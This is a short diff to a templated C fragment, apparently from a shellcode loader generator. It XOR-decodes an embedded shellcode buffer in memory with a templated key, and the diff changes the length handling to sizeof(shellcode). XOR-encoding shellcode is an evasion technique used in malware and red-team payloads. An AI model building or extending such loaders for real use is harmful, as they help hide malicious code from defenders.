@@ -2,21 +2,21 @@
     const char * key = "{{.Key}}";
 
     {{if .Debug}}
-    printf("[*] Xor Decoding shellcode\n\tBytes Before %x %x %x\n\tshellcodelen %x\n",shellcode[0], shellcode[1], shellcode[2], shellcodeLen);
+    printf("[*] Xor Decoding shellcode\n\tBytes Before %x %x %x\n\tshellcodelen %x\n",shellcode[0], shellcode[1], shellcode[2], sizeof(shellcode));
     {{end}}
 
-    unsigned char * decrypted = calloc(shellcodeLen, sizeof(unsigned char));
+    unsigned char * decrypted = calloc(sizeof(shellcode), sizeof(unsigned char));
 
     // decrypt data (xor decrypt)
-    for (int i = 0; i < shellcodeLen; i++){
+    for (int i = 0; i < sizeof(shellcode); i++){
         decrypted[i] = shellcode[i] ^ key[i%strlen(key)];
     }
 
     {{if .Debug}}
-    printf("Xor complete\n");
+    printf("\t[+] Xor complete\n");
     {{end}}
 
-    memcpy(shellcode, decrypted, shellcodeLen);
+    memcpy(shellcode, decrypted, sizeof(shellcode));
 
     {{if .Debug}}
     printf("[*] Xor Decoding complete\n\tBytes After %x %x %x\n",shellcode[0], shellcode[1], shellcode[2]);
